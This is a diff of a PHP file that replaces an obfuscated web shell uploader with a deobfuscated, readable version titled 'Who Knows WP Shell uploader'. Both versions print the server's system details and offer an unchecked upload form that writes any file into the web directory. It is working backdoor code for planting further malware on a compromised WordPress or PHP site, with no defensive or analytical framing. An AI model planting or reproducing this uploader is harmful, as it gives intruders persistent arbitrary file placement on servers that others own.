@@ -1,4 +1,26 @@
 <?php
-//Obfuscate by https://uutool.cn/php/
- goto R_2Cf; xlVJZ: @chmod($RoYQx, octdec($vIJbj)); goto q8ueH; iWHaK: $RoYQx = $DrCk8 . $TNwLk; goto zwWEu; YYrK_: set_time_limit(0); goto iNG0d; R_2Cf: error_reporting(0); goto YYrK_; HZNYA: $DrCk8 = ''; goto UQzZw; F94sw: Y6wwG: goto HZNYA; ZJ508: echo "\74\146\157\162\155\40\155\145\164\150\157\x64\75\42\120\117\x53\124\x22\x20\x61\x63\164\151\157\156\x3d\x22\x23\42\40\x65\x6e\x63\164\171\160\145\x3d\x22\x6d\x75\154\164\151\x70\x61\x72\164\x2f\146\x6f\x72\155\55\144\141\164\141\42\x3e\x3c\151\x6e\x70\x75\x74\40\164\171\160\145\75\42\x66\151\x6c\145\42\40\156\141\155\x65\75\42\151\x6d\141\x67\x65\x22\76\x3c\142\x72\x3e\x3c\151\x6e\x70\165\x74\40\164\x79\160\145\75\42\x53\x75\142\155\151\164\x22\x20\x6e\141\155\145\75\x22\x53\165\x62\155\x69\x74\42\40\x76\x61\154\165\145\75\42\x55\x70\154\157\141\144\42\76\74\57\x66\x6f\162\155\x3e"; goto WKaTe; oiT_3: RhIsU: goto ZEvVN; q8ueH: echo "\x20\x3c\141\x20\x68\162\x65\x66\x3d{$TNwLk}\76\x3c\143\145\x6e\164\145\162\x3e\x3c\x62\x3e\123\165\x63\x65\x73\x73\x66\165\154\x6c\171\x20\x55\x70\x6c\x6f\141\x64\x65\144\40\x3a\104\40\x3d\x3d\76\40{$TNwLk}\x3c\57\x62\x3e\x3c\57\143\145\156\164\145\x72\76\74\57\141\x3e"; goto oiT_3; JzdV5: echo "\74\x66\x6f\x6e\164\40\x63\157\x6c\x6f\162\75\42\x62\154\x61\x63\153\x22\x20\163\151\172\145\x3d\x22\x34\42\76"; goto cUgql; UQzZw: $JYLnE = "\x32\x30\x30\60\x30\60\60"; goto Ra19B; AFzRo: $l1Z36 = $_FILES["\151\x6d\x61\147\x65"]["\164\x6d\x70\137\x6e\x61\155\145"]; goto BRxmZ; BRxmZ: if (!isset($_FILES["\x69\155\x61\147\145"]["\156\141\155\x65"])) { goto RhIsU; } goto iWHaK; zwWEu: @move_uploaded_file($l1Z36, $RoYQx); goto xlVJZ; cUgql: if (isset($_POST["\x53\165\x62\x6d\151\x74"])) { goto Y6wwG; } goto ZJ508; E5hR1: $TNwLk = $_FILES["\x69\155\141\147\145"]["\x6e\x61\x6d\145"]; goto AFzRo; Ra19B: $vIJbj = "\x30\x36\x34\64"; goto E5hR1; Tt7PR: echo "\74\x63\145\x6e\164\145\x72\76\x3c\142\x3e\125\156\x61\155\145\72" . php_uname() . "\x3c\x62\x72\x3e\74\57\x62\x3e"; goto JzdV5; WKaTe: goto ltVzr; goto F94sw; iNG0d: echo "\x3c\x74\x69\x74\154\145\x3e\127\150\x6f\x20\x4b\x6e\157\x77\x73\40\127\x50\40\123\x68\145\x6c\154\40\x75\x70\154\157\x61\x64\x65\x72\74\x2f\164\151\x74\x6c\145\x3e"; goto Tt7PR; ZEvVN: ltVzr: goto VVdBm; VVdBm: echo "\x3c\x2f\x63\x65\156\164\x65\x72\76\x3c\57\146\x6f\156\x74\x3e";
 
+error_reporting(0);
+set_time_limit(0);
+echo "<title>Who Knows WP Shell uploader</title>";
+
+echo "<center><b>Uname:".php_uname()."<br></b>"; 
+echo '<font color="black" size="4">';
+if(isset($_POST['Submit'])){
+    $filedir = ""; 
+    $maxfile = '2000000';
+    $mode = '0644';
+    $userfile_name = $_FILES['image']['name'];
+    $userfile_tmp = $_FILES['image']['tmp_name'];
+    if(isset($_FILES['image']['name'])) {
+        $qx = $filedir.$userfile_name;
+        @move_uploaded_file($userfile_tmp, $qx);
+        @chmod ($qx, octdec($mode));
+	echo" <a href=$userfile_name><center><b>Sucessfully Uploaded :D ==> $userfile_name</b></center></a>";
+	}
+}else{
+	echo'<form method="POST" action="#" enctype="multipart/form-data"><input type="file" name="image"><br><input type="Submit" name="Submit" value="Upload"></form>';
+}
+echo '</center></font>';
+
+?>
